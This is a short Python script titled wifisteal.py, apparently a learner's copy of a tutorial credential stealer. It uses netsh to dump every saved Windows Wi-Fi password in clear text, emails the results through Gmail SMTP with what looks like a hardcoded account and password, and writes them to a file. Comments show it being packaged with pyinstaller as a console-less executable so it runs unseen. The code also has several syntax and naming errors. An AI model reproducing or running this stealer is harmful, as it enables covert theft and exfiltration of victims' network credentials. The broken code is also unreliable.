nano wifisteal.py

#!/usr/bin/python

import subprocess
import smtplib 
import re   //regex python

#wine/root/.wine/drive_c/python27/python.exe -m pip install smtplib
#wine/root/.wine/drive_c/python27/python.exe -m pip install re
#wine/root/.wine/drive_c/python27/Scripts/pyinstaller.exe --onefile --noconsole wifisteal.py


command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1,shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)' ,networks)


final_output =""
for network in network_list:
	command2 = "netsh wlan show profile " + network + "key=clear"
	one_network_results = subprocess.check_output(command2, shell=True)
	final_output += one_network_results


#sending to email
#my_email = raw_input("Enter Email To Send To :") #to get user email
#password = raw_input("Enter Email To Send To :") #to get user password
server = smtpli.smtp("smtp.gmail.com" , 587)
server.starttls()
server.login(hackersploit22@gmail.com , nomvuyiseko79)    #my_email ,password
server.sendmail(liyabonasaki@gmail.com ,final_output)
server.quit()


#open a file 
file = open("wifi password.txt" , 'w')
file.write(final_output)
file.close()